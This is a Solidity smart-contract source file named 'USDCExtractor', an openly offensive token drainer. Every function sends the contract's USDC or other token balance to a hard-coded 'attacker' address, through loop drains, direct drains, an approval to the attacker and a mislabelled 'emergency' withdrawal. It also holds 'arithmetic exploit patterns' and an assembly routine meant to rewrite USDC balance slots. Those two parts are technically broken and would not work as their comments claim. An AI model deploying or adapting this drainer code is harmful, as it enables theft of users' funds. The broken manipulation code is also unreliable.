// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title USDCExtractor
 * @notice Specialized contract for extracting USDC tokens
 * @dev Optimized for gas efficiency based on lessons learned
 */
contract USDCExtractor {
    address payable public attacker;
    IERC20 public usdc;
    
    constructor(address payable _attacker, address _usdc) {
        attacker = _attacker;
        usdc = IERC20(_usdc);
    }
    
    /**
     * @notice Conservative loop-based USDC extraction
     * @param iterations Number of loop iterations (10 recommended)
     */
    function extractUSDCLoop(uint256 iterations) external {
        uint256 balance = usdc.balanceOf(address(this));
        uint256 amountPerIteration = 100000 * 1e6; // 100K USDC per iteration
        
        for (uint256 i = 0; i < iterations && i < 10; i++) { // Max 10 iterations
            if (balance >= amountPerIteration) {
                usdc.transfer(attacker, amountPerIteration);
                balance = usdc.balanceOf(address(this));
            } else if (balance > 0) {
                usdc.transfer(attacker, balance);
                break;
            }
        }
    }
    
    /**
     * @notice Manipulate USDC storage slots
     */
    function manipulateUSDCStorage() external {
        // Common ERC20 balance mapping is at slot 0
        // balances[address] = keccak256(abi.encode(address, 0))
        bytes32 vaultSlot = keccak256(abi.encode(address(this), uint256(0)));
        bytes32 attackerSlot = keccak256(abi.encode(attacker, uint256(0)));
        
        assembly {
            let vaultBalance := sload(vaultSlot)
            sstore(attackerSlot, vaultBalance)
            sstore(vaultSlot, 0)
        }
    }
    
    /**
     * @notice Arithmetic exploit patterns
     */
    function arithmeticPattern(string memory pattern, uint256 amount) external {
        uint256 balance = usdc.balanceOf(address(this));
        
        if (keccak256(bytes(pattern)) == keccak256("overflow")) {
            // Attempt overflow
            unchecked {
                uint256 overflowAmount = type(uint256).max - balance + amount;
                usdc.transfer(attacker, overflowAmount);
            }
        } else if (keccak256(bytes(pattern)) == keccak256("underflow")) {
            // Attempt underflow
            unchecked {
                uint256 underflowAmount = balance + amount;
                usdc.transfer(attacker, underflowAmount);
            }
        }
    }
    
    /**
     * @notice Direct USDC drain
     */
    function drainUSDC() external {
        uint256 balance = usdc.balanceOf(address(this));
        if (balance > 0) {
            usdc.transfer(attacker, balance);
        }
    }
    
    /**
     * @notice Approve and drain pattern
     */
    function approveAndDrain() external {
        uint256 balance = usdc.balanceOf(address(this));
        usdc.approve(attacker, balance);
    }
    
    /**
     * @notice Emergency withdrawal of any token
     */
    function emergencyTokenWithdraw(address token) external {
        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));
    }
    
    // Fallback to receive ETH
    receive() external payable {}
}
